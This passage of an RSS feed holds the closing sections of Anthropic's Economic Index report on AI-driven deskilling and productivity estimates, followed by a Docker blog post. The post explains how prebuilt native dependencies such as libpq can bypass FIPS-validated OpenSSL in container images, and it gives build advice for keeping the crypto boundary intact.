    &lt;p&gt;We next calculate how removing AI-covered tasks shifts the average education level of what remains. Overall, the net first-order impact is to deskill jobs, since AI removes tasks that require relatively higher levels of education. One job that experiences such deskilling is technical writers, which loses tasks like "Analyze developments in specific field to determine need for revisions" (18.7 years) and "Review published materials and recommend revisions or changes in scope, format" (16.4 years), leaving tasks like "Draw sketches to illustrate specified materials" (13.6 years) and "Observe production, developmental, and experimental activities" (13.5 years). Travel agents also experience deskilling because AI covers tasks like "Plan, describe, arrange, and sell itinerary tour packages" (13.5 years) and "Compute cost of travel and accommodations" (13.4 years), while tasks like "Print or request transportation carrier tickets" (12.0 years) and "Collect payment for transportation and accommodations" (11.5 years) remain. Several teaching professions experience deskilling because AI addresses tasks like grading, advising students, writing grants, and conducting research without being able to do the hands-on work of delivering lectures in person and managing a classroom.&lt;/p&gt;
    &lt;p&gt;Some jobs see average education levels increase. Real estate managers experience upskilling because AI covers routine administrative tasks—maintaining sales records (12.8 years), reviewing rents against market rates (12.6 years)—while tasks requiring higher-level professional judgment and in-person interaction remain, like securing loans, negotiating with architecture firms, and meeting with boards.&lt;/p&gt;
    &lt;p&gt;These patterns illustrate how jobs may evolve over the coming years as their task content adjusts in response to AI. If the education level can be interpreted like expertise in Autor and Thompson's analysis, their framework might predict that wages will fall and employment will increase for technical writers and travel agents; conversely, real estate managers will specialize in complex negotiations and stakeholder management, shrinking employment while increasing wages.5&lt;/p&gt;
    &lt;p&gt;However, our education-based measure differs from Autor and Thompson's expertise concept: their framework would label some tasks as high expertise where ours specifies low education—for example, the Electrician task "Connect wires to circuit breakers, transformers, or other components." And these predictions are based on current Claude usage patterns, which will shift as models are trained on new capabilities and users discover new applications—potentially changing which tasks are covered and whether the net effect is deskilling or upskilling.&lt;/p&gt;
    &lt;head rend="h3"&gt;Revisiting the aggregate productivity implications of Claude usage&lt;/head&gt;
    &lt;p&gt;In earlier work, we estimated that widespread adoption of AI could increase US labor productivity growth by 1.8 percentage points annually over the next decade. Here we revisit that analysis, incorporating the task success primitive introduced in this report and a richer treatment of task complementarity.&lt;/p&gt;
    &lt;p&gt;Based on the speedups associated with tasks with at least 200 observations in our sample of 1M Claude.ai conversations,6 we replicate our previous finding that current-generation AI models and current usage patterns imply a productivity effect of 1.8 percentage points per year over the next decade.7&lt;/p&gt;
    &lt;p&gt;With the inclusion of 1P API data, we can assess whether implied labor productivity effects differ based on enterprise Claude deployment patterns. Two countervailing forces are at play: API usage is more concentrated in a narrower set of tasks and occupations (particularly coding-related work), which would tend to reduce implied effects; but task-level speedups are higher on average among API tasks, as implied by Figure 4.1. These forces largely offset: the API sample likewise implies a 1.8 percentage point increase in labor productivity over the next decade.&lt;/p&gt;
    &lt;p&gt;A salient critique of this analysis is that it fails to account for model reliability. If workers must validate AI output, the productivity benefits will be smaller than raw speedups suggest. To assess how quantitatively important this channel might be, we incorporate the task success primitive introduced in this report, multiplying task-level time savings by task-specific success rates before aggregating.8&lt;/p&gt;
    &lt;p&gt;This adjustment has a meaningful effect: implied productivity growth falls from 1.8 to 1.2 percentage points per year for the next decade based on Claude.ai usage, and to 1.0 percentage points for API traffic. Yet, even after accounting for reliability, the implied impact remains economically significant—a sustained increase of 1.0 percentage point per year for the next ten years would return US productivity growth to rates that prevailed in the late 1990s and early 2000s.A second critique concerns task complementarity. If some tasks are essential and cannot easily be substituted, then overall productivity effects will be constrained regardless of speedups on other tasks. Teachers may prepare lesson plans more efficiently with AI while having no impact on time spent with students in the classroom.&lt;/p&gt;
    &lt;p&gt;To operationalize this idea, we impose some structure on how we aggregate task-level time savings within occupations but otherwise add up occupational efficiency gains as in the main analysis. Specifically, we suppose that within each occupation tasks are combined according to a Constant Elasticity of Substitution (CES) aggregator, where each task is weighted by the estimated time spent on each task as calculated in our earlier analysis of the productivity effects implied by Claude usage.9&lt;/p&gt;
    &lt;p&gt;The key parameter is the elasticity of substitution across tasks, σ. When the elasticity of substitution is less than one, tasks are complements and those tasks that are not sped up by AI become bottlenecks for broader productivity gains. Alternatively, when the elasticity of substitution is greater than one, then workers can allocate toward the more productive tasks—thereby amplifying the overall time savings at the occupational level. An elasticity of substitution equal to one is a special case that replicates the main analysis above.&lt;/p&gt;
    &lt;p&gt;Figure 4.6 reports the results of this exercise for different values of task substitutability. As expected, when the elasticity of substitution is equal to one the implied productivity effect is the same as in our baseline analysis: An increase in labor productivity growth of ~1.8 percentage points per year over the next decade implied by both Claude.ai and API samples.&lt;/p&gt;
    &lt;p&gt;When tasks are complements, however, the implied aggregate labor productivity impact declines sharply as the economic effects are bottlenecked by tasks that AI speeds up the least. For example, at =0.5 the implied overall labor productivity effect is 0.7-0.9 percentage points per year—around half the size as implied by our baseline estimates. Additionally adjusting for task success further reduces the implied productivity effects to 0.8pp for Claude.ai and 0.6pp for API.&lt;/p&gt;
    &lt;p&gt;On the other hand, when the elasticity of substitution is greater than one, the implied labor productivity based on pre-Opus 4.5 usage patterns is materially higher. For example, at =1.5 the implied labor productivity effect rises to 2.2-2.6 percentage points per year, consistent with greater specialization in tasks where AI provides the largest speedups.&lt;/p&gt;
    &lt;p&gt;In both cases the implied productivity impact based on API traffic is more responsive to the degree of task substitutability. This is consistent with the fact that there is a larger share of API traffic concentrated in fewer tasks and associated occupations as compared to Claude.ai: When tasks are complements, this concentration amplifies the bottleneck problem; when they are substitutes, it amplifies productivity gains from task specialization.&lt;/p&gt;
    &lt;p&gt;What this analysis shows is that the productivity effects of automation may ultimately be constrained by bottleneck tasks that elude AI automation for the time being. And the labor market implications of increasingly capable AI could be similarly affected by such forces. For example, Gans and Goldfarb (2026) argue that the presence of bottleneck tasks within jobs means that partial AI automation can lead to an increase in labor income as such tasks increase in economic value (at least until a job is entirely automated).&lt;/p&gt;
    &lt;head rend="h3"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;The upshot of this chapter is that the impact of AI on the economy is unlikely to be uniform. As our effective AI coverage framework illustrates, the labor market implications for different workers will hinge on how reliable frontier AI tools are for their most central tasks.&lt;/p&gt;
    &lt;p&gt;But the labor market effects may also depend on the skill requirements of tasks that AI can proficiently handle relative to the rest of the economy. Indeed, we find that removing tasks Claude can already handle from the economy would produce a net deskilling effect: the tasks remaining for humans have lower educational requirements than those handled by AI.&lt;/p&gt;
    &lt;p&gt;While highly suggestive, this may miss an important detail: the most complex tasks where Claude is used tend also to be those where it struggles most. Rather than displacing highly skilled professionals, this could instead reinforce the value of their complementary expertise in understanding AI's work and assessing its quality.&lt;/p&gt;
    &lt;p&gt;The counterpart to these transformative labor market effects is the broader impact on growth and productivity. On the one hand, incorporating task reliability into our analysis diminishes the implied effect on labor productivity growth as informed by current Claude usage patterns. If bottleneck tasks bind, the implied impact diminishes further. On the other hand, the continuing growth in model capabilities suggests that both task coverage and task success may increase, which, in turn, could increase productivity impacts.&lt;/p&gt;
    &lt;p&gt;1 When we study the correlation between primitives with the O*NET, we restrict to tasks appearing in at least 100 conversations to reduce measurement error. In the coverage analysis, we use all tasks above the privacy threshold of 15.&lt;/p&gt;
    &lt;p&gt;2 Our online appendix is available at https://huggingface.co/datasets/Anthropic/EconomicIndex.&lt;/p&gt;
    &lt;p&gt;3 See also Tomlinson et al (2025) for a related AI applicability score.&lt;/p&gt;
    &lt;p&gt;4 We generate embeddings for each task statement using a pretrained sentence transformer (all-mpnet-base-v2) and predict education with Ridge regression.&lt;/p&gt;
    &lt;p&gt;5 On the other hand, some historical evidence suggests that when technologies automating job tasks appear in patent data, employment and wages subsequently fall for exposed occupations (Webb 2020).&lt;/p&gt;
    &lt;p&gt;6 When we first assessed the aggregate productivity implications of Claude usage, we relied on a sample of 100k Claude.ai conversations from Fall 2025. Based on the set of tasks for which we observed speedups, we estimated that labor productivity could be 1.8 percentage points higher per year over the next decade. Expanding the sample to 1M observations means that we need to take a stand on how to handle very infrequently occurring tasks—which are very common given that usage follows a power law, as we documented in our past report. We choose a threshold of 0.02% because it replicates our previous results for our sample of Claude.ai conversations. For privacy-preserving reasons, we only ever analyze tasks with at least 15 observations, or an implied threshold of 0.015% for a 100k sample. And so our results are internally consistent across samples. If we do not impose a restriction on our 1M sample and assume that efficiency gains for any task in our sample, even those with just 15 observations out of one million, the implied aggregate labor productivity growth over the next decade would be roughly 5% percentage points per year—a mechanical increase based on a the much larger set of tasks included.&lt;/p&gt;
    &lt;p&gt;7 As before, this result is based on applying Hulten’s Theorem to task-level productivity shocks and assuming that the corresponding one-time increase in total factor productivity materializes over the course of a decade alongside capital deepening effects.&lt;lb/&gt;8 As a reminder, for aggregating to implied labor productivity we calculate task-level efficiency gains as the log difference between human time without AI and with AI. There are certainly other ways to adjust based on task reliability. If tasks in our sample are composed of sub-tasks with heterogeneous AI applicability, and workers optimally deploy AI only on sub-tasks where it is effective, then scaling the efficiency gain by the success rate captures the extensive margin of AI adoption within a task.&lt;/p&gt;
    &lt;p&gt;9 We use a CES (constant elasticity of substitution) production function to aggregate task-level time savings to economy-wide productivity impacts. The elasticity parameter σ governs how easily workers can substitute between tasks. When σ=1, we apply Hulten's theorem directly: the aggregate productivity gain equals the wage-share-weighted sum of log speedups across tasks. For σ≠1, we use a two-level aggregation: first, within each occupation, we compute an occupation-level speedup as a CES aggregate of task speedups weighted by time fractions, using ρ=(σ-1)/σ. Then we apply Hulten's theorem to these occupation-level speedups. When σ&amp;lt;1 (complements), productivity gains are bottlenecked by tasks with the smallest speedups. When σ&amp;gt;1 (substitutes), workers can specialize in tasks where AI provides the largest speedups, amplifying aggregate gains. For tasks without observed AI speedup data, we assume no productivity change. We thank Pascual Restrepo for suggesting this particular exercise.&lt;/p&gt;
    &lt;head rend="h2"&gt;Concluding Remarks&lt;/head&gt;
    &lt;p&gt;This fourth Anthropic Economic Index Report introduces economic primitives—foundational characteristics of AI use—that show how Claude is used by both consumers and firms. We use Claude to estimate the extent to which usage varies along these dimensions; these measures are directionally accurate and, taken together, provide important signals even if individual classifications are imperfect.&lt;/p&gt;
    &lt;p&gt;Our findings carry significant implications for how AI will reshape economies and labor markets. Notably, Claude tends to be used more, and appears to provide greater productivity boosts, on tasks that require higher education. If these tasks shrink for US workers, the net effect could be to deskill jobs. But these impacts depend crucially on complementarity across tasks, and whether increased productivity at a certain task may increase the demand for it.&lt;/p&gt;
    &lt;p&gt;At the global level, the strong relationship between per capita income and usage patterns—with higher-income nations using Claude collaboratively while lower-income countries focus on coursework and specific applications—suggests that AI's impact will be mediated by existing institutional structures rather than unfolding uniformly. Geographic diffusion patterns reinforce this picture. Within the US, per capita usage has converged slightly; globally, diffusion is slower. Combined with income-driven differences in how AI is used, this raises questions about whether AI will narrow or widen international economic gaps.&lt;/p&gt;
    &lt;p&gt;Equally important to the patterns documented here are potential changes across this and subsequent reports. As AI capabilities advance, Claude's success rate may increase, usage patterns may show greater autonomy, users may tackle new and more complex tasks, and tasks that prove automatable may graduate from interactive chat to API deployment. We will track these dynamics over time, providing a longitudinal view of AI's role in the economy.&lt;/p&gt;
    &lt;p&gt;Building on prior releases, this edition significantly expands both the scope and transparency of usage data we share, including task-level classifications along new dimensions and regional breakdowns globally for the first time. We publish this data to enable researchers, journalists, and the public to investigate novel questions about AI's economic impacts that can form the empirical foundation for policy responses.&lt;/p&gt;
    &lt;p&gt;How willing users are to experiment with AI, and whether policymakers create a regulatory context that advances both safety and innovation, will shape how AI transforms economies. For AI to benefit users globally, expanding access alone will not suffice—developing the human capital that enables effective use, particularly in lower-income economies, is essential.&lt;/p&gt;
    &lt;head rend="h2"&gt;Authors &amp;amp; Acknowledgements&lt;/head&gt;
    &lt;head rend="h4"&gt;First Author Block*:&lt;/head&gt;
    &lt;p&gt;Ruth Appel, Maxim Massenkoff, Peter McCrory&lt;/p&gt;
    &lt;p&gt;*Lead authors of the report&lt;/p&gt;
    &lt;head rend="h4"&gt;Second Author Block:&lt;/head&gt;
    &lt;p&gt;Miles McCain, Ryan Heller, Tyler Neylon, Alex Tamkin&lt;/p&gt;
    &lt;head rend="h4"&gt;Acknowledgements&lt;/head&gt;
    &lt;p&gt;Xabi Azagirre, Tim Belonax, Keir Bradwell, Andy Braden, Dexter Callender III, Sylvie Carr, Miriam Chaum, Ronan Davy, Evan Frondorf, Deep Ganguli, Kunal Handa, Andrew Ho, Rebecca Jacobs, Owen Kaye-Kauderer, Bianca Lindner, Kelly Loftus, James Ma, Jennifer Martinez, Jared Mueller, Kelsey Nanan, Kim O'Rourke, Dianne Penn, Sarah Pollack, Ankur Rathi, Zoe Richards, Alexandra Sanderford, David Saunders, Michael Sellitto, Thariq Shihipar, Michael Stern, Kim Withee, Mengyi Xu, Tony Zeng, Xiuruo Zhang, Shuyi Zheng, Emily Pastewka, Angeli Jain, Sarah Heck, Jared Kaplan, Jack Clark, Dario Amodei&lt;/p&gt;
    &lt;head rend="h4"&gt;&lt;lb/&gt;Citation &lt;/head&gt;
    &lt;code&gt;@online{anthropic2026aeiv4,
        author = {Ruth Appel and Maxim Massenkoff and Peter McCrory and Miles McCain and Ryan Heller and Tyler Neylon and Alex Tamkin},
        title = {Anthropic Economic Index report: economic primitives},
        date = {2026-01-15},
        year = {2026},
        url = {https://www.anthropic.com/research/anthropic-economic-index-january-2026-report},
}&lt;/code&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46725632</guid><pubDate>Thu, 22 Jan 2026 21:54:02 +0000</pubDate></item><item><title>FIPS Dependencies and Prebuilt Binaries</title><link>https://www.docker.com/blog/fips-dependencies-and-prebuilt-binaries/</link><description>&lt;doc fingerprint="27061b127d23fbf8"&gt;
  &lt;main&gt;
    &lt;p&gt;FIPS compliance is a great idea that makes the entire software supply chain safer. But teams adopting FIPS-enabled container images are running into strange errors that can be challenging to debug. What they are learning is that correctness at the base image layer does not guarantee compatibility across the ecosystem. Change is complicated, and changing complicated systems with intricate dependency webs often yields surprises. We are in the early adaptation phase of FIPS, and that actually provides interesting opportunities to optimize how things work. Teams that recognize this will rethink how they build FIPS and get ahead of the game.&lt;/p&gt;
    &lt;head rend="h2"&gt;FIPS in practice&lt;/head&gt;
    &lt;p&gt;FIPS is a U.S. government standard for cryptography. In simple terms, if you say a system is “FIPS compliant,” that means the cryptographic operations like TLS, hashing, signatures, and random number generation are performed using a specific, validated crypto module in an approved mode. That sounds straightforward until you remember that modern software is built not as one compiled program, but as a web of dependencies that carry their own baggage and quirks.&lt;/p&gt;
    &lt;head rend="h2"&gt;The FIPS crypto error that caught us off guard&lt;/head&gt;
    &lt;p&gt;We got a ticket recently for a Rails application in a FIPS-enabled container image. On the surface, everything looked right. Ruby was built to use OpenSSL 3.x with the FIPS provider. The OpenSSL configuration was correct. FIPS mode was active.&lt;/p&gt;
    &lt;p&gt;However, the application started throwing cryptography module errors from the Postgres Rubygem module. Even more confusing, a minimal reproducer of a basic Ruby app and a stock postgres did not reproduce the error and a connection was successfully established. The issue only manifested when using ActiveRecord.&lt;/p&gt;
    &lt;p&gt;The difference came down to code paths. A basic Ruby script using the pg gem directly exercises a simpler set of operations. ActiveRecord triggers additional functionality that exercises different parts of libpq. The non-FIPS crypto was there all along, but only certain operations exposed it.&lt;/p&gt;
    &lt;p&gt;Your container image can be carefully configured for FIPS, and your application can still end up using non-FIPS crypto because a dependency brought its own crypto along for the ride. In this case, the culprit was a precompiled native artifact associated with the database stack. When you install pg, Bundler may choose to download a prebuilt binary dependency such as libpq.&lt;/p&gt;
    &lt;p&gt;Unfortunately those prebuilt binaries are usually built with assumptions that cause problems. They may be linked against a different OpenSSL than the one in your image. They may contain statically embedded crypto code. They may load crypto at runtime in a way that is not obvious.&lt;/p&gt;
    &lt;p&gt;This is the core challenge with FIPS adoption. Your base image can do everything right, but prebuilt dependencies can silently bypass your carefully configured crypto boundary.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why we cannot just fix it in the base image yet&lt;/head&gt;
    &lt;p&gt;The practical fix for the Ruby case was adding this to your Gemfile.&lt;/p&gt;
    &lt;code&gt;
gem "pg", "~&amp;gt; 1.1", force_ruby_platform: true
&lt;/code&gt;
    &lt;p&gt;You also need to install libpq-dev to allow compiling from source. This forces Bundler to build the gem from source on your system instead of using a prebuilt binary. When you compile from source inside your controlled build environment, the resulting native extension is linked against the OpenSSL that is actually in your FIPS image.&lt;/p&gt;
    &lt;p&gt;Bundler also supports an environment/config knob for the same idea called &lt;code&gt;BUNDLE_FORCE_RUBY_PLATFORM&lt;/code&gt;. The exact mechanism matters less than the underlying strategy of avoiding prebuilt native artifacts when you are trying to enforce a crypto boundary.&lt;/p&gt;
    &lt;p&gt;You might reasonably ask why we do not just add &lt;code&gt;BUNDLE_FORCE_RUBY_PLATFORM&lt;/code&gt; to the Ruby FIPS image by default. We discussed this internally, and the answer illustrates why FIPS complexity cascades.&lt;/p&gt;
    &lt;p&gt;Setting that flag globally is not enough on its own. You also need a C compiler and the relevant libraries and headers in the build stage. And not every gem needs this treatment. If you flip the switch globally, you end up compiling every native gem from source, which drags in additional headers and system libraries that you now need to provide. The “simple fix” creates a new dependency management problem.&lt;/p&gt;
    &lt;p&gt;Teams adopt FIPS images to satisfy compliance. Then they have to add back build complexity to make the crypto boundary real and verify that every dependency respects it. This is not a flaw in FIPS or in the tooling. It is an inherent consequence of retrofitting a strict cryptographic boundary onto an ecosystem built around convenience and precompiled artifacts.&lt;/p&gt;
    &lt;p&gt;The patterns we are documenting today will become the defaults tomorrow. The tooling will catch up. Prebuilt packages will get better. Build systems will learn to handle the edge cases. But right now, teams need to understand where the pitfalls are.&lt;/p&gt;
    &lt;head rend="h2"&gt;What to do if you are starting a FIPS journey&lt;/head&gt;
    &lt;p&gt;You do not need to become a crypto expert to avoid the obvious traps. You only need a checklist mindset. The teams working through these problems now are building real expertise that will be valuable as FIPS requirements expand across industries.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Treat prebuilt native dependencies as suspect. If a dependency includes compiled code, assume it might carry its own crypto linkage until you verify otherwise. You can use ldd on Linux to inspect dynamic linking and confirm that binaries link against your system OpenSSL rather than a bundled alternative.&lt;/item&gt;
      &lt;item&gt;Use a multi-stage build and compile where it matters. Keep your runtime image slim, but allow a builder stage with the compiler and headers needed to compile the few native pieces that must align with your FIPS OpenSSL.&lt;/item&gt;
      &lt;item&gt;Test the real execution path, not just “it starts.” For Rails, that means running a query, not only booting the app or opening a connection. The failures we saw appeared when using the ORM, not on first connection.&lt;/item&gt;
      &lt;item&gt;Budget for supply-chain debugging. The hard part is not turning on FIPS mode. The hard part is making sure all the moving parts actually respect it. Expect to spend time tracing crypto usage through your dependency graph.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Why this matters beyond government contracts&lt;/head&gt;
    &lt;p&gt;FIPS compliance has traditionally been seen as a checkbox for federal sales. That is changing. As supply chain security becomes a board-level concern across industries, validated cryptography is moving from “nice to have” to “expected.” The skills teams build solving FIPS problems today translate directly to broader supply chain security challenges.&lt;/p&gt;
    &lt;p&gt;Think about what you learn when you debug a FIPS failure. You learn to trace crypto usage through your dependency graph, to question prebuilt artifacts, to verify that your security boundaries are actually enforced at runtime. Those skills matter whether you are chasing a FedRAMP certification or just trying to answer your CISO’s questions about software provenance.&lt;/p&gt;
    &lt;head rend="h2"&gt;The opportunity in the complexity&lt;/head&gt;
    &lt;p&gt;FIPS is not “just a switch” you flip in a base image. View FIPS instead as a new layer of complexity that you might have to debug across your dependency graph. That can sound like bad news, but switch the framing and it becomes an opportunity to get ahead of where the industry is going.&lt;/p&gt;
    &lt;p&gt;The ecosystem will adapt and the tooling will improve. The teams investing in understanding these problems now will be the ones who can move fastest when FIPS or something like it becomes table stakes.&lt;/p&gt;
    &lt;p&gt;If you are planning a FIPS rollout, start by controlling the prebuilt native artifacts that quietly bypass the crypto module you thought you were using. Recognize that every problem you solve is building institutional knowledge that compounds over time. This is not just compliance work. It is an investment in your team’s security engineering capability.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46726259</guid><pubDate>Thu, 22 Jan 2026 23:04:25 +0000</pubDate></item></channel></rss>